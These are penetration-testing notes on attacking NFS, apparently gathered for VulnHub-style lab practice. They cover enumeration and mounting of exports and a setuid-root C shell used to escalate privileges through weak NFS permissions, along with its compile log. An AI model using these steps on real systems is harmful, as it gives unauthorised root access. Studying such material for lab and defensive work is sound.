credits: s0wr0b1ndef , gajos112 and jivoi
-----------------------------NFS DESCRIPTION-----------------------------

1. Network FILE SYSTEM

Network File System (NFS) - remote filesystem access [RFC 1813] [RFC5665]. A commonly scanned and exploited attack vector. Normally, port scanning is needed to find which port this service runs on, but since most installations run NFS on this port, hackers/crackers can bypass fingerprinting and try this port directly.

FreeBSD is vulnerable to a denial of service attack. A remote attacker could send a specially-crafted NFS Mount request to TCP port 2049 to cause a kernel panic, resulting in a denial of service.
References: [CVE-2006-0900] [BID-16838]

Stack-based buffer overflow in nfsd.exe in XLink Omni-NFS Server 5.2 allows remote attackers to execute arbitrary code via a crafted TCP packet to port 2049 (nfsd), as demonstrated by vd_xlink.pm.
References: [CVE-2006-5780] [BID-20941] [SECUNIA-22751]

Novell Netware is vulnerable to a stack-based buffer overflow, caused by improper bounds checking by the xnfs.nlm component when processing NFS requests. By sending a specially-crafted NFS RPC request to UDP port 2049, a remote attacker could overflow a buffer and execute arbitrary code on the system or cause the server to crash.

-----------------------------NFS MOUNT-----------------------------

2. Mount NFS share

root@kali:~# showmount -h
Usage: showmount [-adehv]
[--all] [--directories] [--exports]
[--no-headers] [--help] [--version] [host]
root@kali:~# showmount 172.16.1.109
Hosts on 172.16.1.109:
root@kali:~# showmount -e 172.16.1.109
Export list for 172.16.1.109:
/var/nfsshare *
root@kali:~# mkdir /tmp/nfs
root@kali:~# mount -t nfs 172.16.1.109:/var/nfsshare /tmp/nfs -nolock
root@kali:~# cd /tmp
root@kali:/tmp# ls -al
total 52
drwxrwxrwt 12 root       root       4096 Oct 30 23:22 .
drwxr-xr-x 22 root       root       4096 Sep 29 03:47 ..
...
drwxr-x---  2 nobody     4294967294 4096 Sep  2  2012 nfs
...
root@kali:/tmp# cd /tmp/nfs


----------------------------------------------s0wr0b1ndef----------------------------------
nmap -sV --script=nfs-* 172.16.1.109
nmap -sV --script=nfs-ls 172.16.1.109  //same result as rpcinfo
nmap -sV --script=nfs-* 172.16.1.109 // all nfs scripts

rpcinfo -p 172.x.x.x
rpcclient -I 172.x.x.x

#mount NTFS share
mount -t nfs 172.16.1.109:/var/nfsshare /tmp/nfs -nolock

#enumerate NFS shares
showmount -e 172.16.1.109

# If you see any NFS related ACL port open, see /etc/exports
#   2049/tcp  nfs_acl
# /etc/exports: the access control list for filesystems which may be exported to NFS clients.  See exports(5).

READ:
https://pentestlab.blog/tag/rpc/

See root squashing
https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/

--------------------------------------------------GET SHELL--------------------------------------------
Veja: https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/

Crie seu shell em C e compile:

```
// gcc -o /tmp/rootshell /tmp/rootshell.c
// chmod u+s /tmp/rootshell

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}
```

root@an4kein:~/vulnhub/bravery/compile# vim rootshell.c^C
root@an4kein:~/vulnhub/bravery/compile# cat rootshell.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
        setuid(0); setgid(0); system("/bin/bash");
}
root@an4kein:~/vulnhub/bravery/compile# ls
rootshell.c
root@an4kein:~/vulnhub/bravery/compile# gcc -o rootshell rootshell.c
rootshell.c: In function ‘main’:
rootshell.c:6:24: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    6 |  setuid(0); setgid(0); system("/bin/bash");
      |                        ^~~~~~
root@an4kein:~/vulnhub/bravery/compile# ls
rootshell  rootshell.c
root@an4kein:~/vulnhub/bravery/compile# chmod u+s rootshell
root@an4kein:~/vulnhub/bravery/compile# ls
rootshell  rootshell.c
root@an4kein:~/vulnhub/bravery/compile# 

